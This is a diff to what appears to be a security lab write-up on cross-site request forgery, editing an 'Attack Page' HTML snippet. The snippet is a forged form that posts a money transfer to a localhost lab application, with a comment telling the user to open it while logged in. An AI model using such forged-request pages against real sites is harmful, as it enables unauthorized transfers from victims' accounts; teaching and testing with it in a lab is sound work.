@@ -10,7 +10,9 @@
 ## Attack Page
 
 ```html
-<form action="http://localhost/lab4-csrf/transfer_action.php" method="POST">
+<!-- Attacker page (save as attacker.html and open while logged in) -->
+<form action="http://localhost/A012025-Broken-Access-Control/lab4-csrf/transfer_action.php"
+      method="POST">
   <input name="to" value="2">
   <input name="amount" value="100">
 </form>
